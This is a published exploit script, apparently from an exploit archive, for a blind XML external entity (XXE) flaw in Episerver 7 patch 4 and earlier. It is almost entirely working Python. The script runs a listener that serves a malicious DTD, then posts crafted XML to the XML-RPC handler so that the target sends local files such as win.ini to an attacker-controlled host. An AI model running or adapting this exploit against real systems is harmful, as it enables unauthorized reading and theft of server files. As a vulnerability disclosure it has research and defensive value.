# Exploit Author: Jonas Lejon
# Vendor Homepage: https://www.episerver.se/
# Version: Episerver 7 patch 4 and below
# CVE : N/A
 
## episploit.py - Blind XXE file read exploit for Episerver 7 patch 4 and below
## Starts a listening webserver, so the exploits needs a public IP and unfiltered port, configure RHOST below!
## Usage: ./episploit.py <target> [file-to-read]
 
#!/usr/bin/python
 
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import urllib
import re
import sys
import time
import threading
import socket
 
SERVER_SOCKET   = (&#039;0.0.0.0&#039;, 8000)
EXFIL_FILE      = &#039;file:///c:/windows/win.ini&#039;
 
# The public facing IP. Change this
RHOST           = &#039;1.2.3.4:&#039; + str(SERVER_SOCKET[1])
 
EXFILTRATED_EVENT = threading.Event()
 
class BlindXXEServer(BaseHTTPRequestHandler):
 
    def response(self, **data):
        code = data.get(&#039;code&#039;, 200)
        content_type = data.get(&#039;content_type&#039;, &#039;text/plain&#039;)
        body = data.get(&#039;body&#039;, &#039;&#039;)
 
        self.send_response(code)
        self.send_header(&#039;Content-Type&#039;, content_type)
        self.end_headers()
        self.wfile.write(body.encode(&#039;utf-8&#039;))
        self.wfile.close()
 
    def do_GET(self):
        self.request_handler(self)
 
    def do_POST(self):
        self.request_handler(self)
 
    def log_message(self, format, *args):
        return
 
    def request_handler(self, request):
        global EXFILTRATED_EVENT
 
        path = urllib.unquote(request.path).decode(&#039;utf8&#039;)
        m = re.search(&#039;\/\?exfil=(.*)&#039;, path, re.MULTILINE)
        if m and request.command.lower() == &#039;get&#039;:
            data = path[len(&#039;/?exfil=&#039;):]
            print &#039;Exfiltrated %s:&#039; % EXFIL_FILE
            print &#039;-&#039; * 30
            print urllib.unquote(data).decode(&#039;utf8&#039;)
            print &#039;-&#039; * 30 + &#039;\n&#039;
            self.response(body=&#039;true&#039;)
 
            EXFILTRATED_EVENT.set()
 
        elif request.path.endswith(&#039;.dtd&#039;):
            print &#039;Sending malicious DTD file.&#039;
            dtd = &#039;&#039;&#039;<!ENTITY %% param_exfil SYSTEM "%(exfil_file)s">
<!ENTITY %% param_request "<!ENTITY exfil SYSTEM &#039;http://%(exfil_host)s/?exfil=%%param_exfil;&#039;>">
%%param_request;&#039;&#039;&#039; % {&#039;exfil_file&#039; : EXFIL_FILE, &#039;exfil_host&#039; : RHOST}
 
            self.response(content_type=&#039;text/xml&#039;, body=dtd)
 
        else:
            print &#039;[INFO] %s %s&#039; % (request.command, request.path)
            self.response(body=&#039;false&#039;)
 
def send_stage1(target):
    content = &#039;&#039;&#039;<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://&#039;&#039;&#039; + RHOST + &#039;&#039;&#039;/test.dtd"><foo>&exfil;</foo>&#039;&#039;&#039;
    payload = &#039;&#039;&#039;POST /util/xmlrpc/Handler.ashx?pageid=1023 HTTP/1.1
Host: &#039;&#039;&#039; + target + &#039;&#039;&#039;
User-Agent: curl/7.54.0
Accept: */*
Content-Length: &#039;&#039;&#039; + str(len(content)) + &#039;&#039;&#039;
Content-Type: application/x-www-form-urlencoded
Connection: close
 
&#039;&#039;&#039; + content
 
    print "Sending payload.."
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 80
    s.connect((target,port))
    s.send(payload)
 
def main(target):
    server = HTTPServer(SERVER_SOCKET, BlindXXEServer)
    thread = threading.Thread(target=server.serve_forever)
    thread.daemon = True
    thread.start()
    send_stage1(target)
 
    while not EXFILTRATED_EVENT.is_set():
        pass
 
if __name__ == &#039;__main__&#039;:
    if len(sys.argv) > 1:
        target = sys.argv[1]
    if len(sys.argv) > 2:
        EXFIL_FILE = sys.argv[2]
    main(target)

